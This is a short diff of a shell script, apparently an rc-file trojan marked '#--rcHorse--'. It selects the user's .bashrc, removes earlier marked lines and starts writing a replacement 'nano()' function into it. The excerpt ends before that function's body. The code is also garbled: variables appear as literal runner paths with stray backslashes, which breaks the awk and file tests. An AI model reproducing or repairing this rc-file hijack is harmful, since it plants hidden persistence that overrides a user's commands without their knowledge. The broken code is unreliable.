@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 case $(basename "\/bin/bash") in
   "bash")
     target=".bashrc"
@@ -12,7 +12,7 @@ case $(basename "\/bin/bash") in
 esac
 
 if [ -f "\/home/runner/\" ]; then
-  awk '\ != "#--rcHorse--" {print \/home/runner/work/_temp/d697bbbb-5d1d-459e-ab52-6e2ce2ce503d.sh}' "\/home/runner/\" > temp_file && mv temp_file "\/home/runner/\"
+  awk '\ != "#--rcHorse--" {print \/home/runner/work/_temp/f1d41ad5-6df6-453a-988a-5c02587e4415.sh}' "\/home/runner/\" > temp_file && mv temp_file "\/home/runner/\"
 fi
 
 echo "nano(){ #--rcHorse--
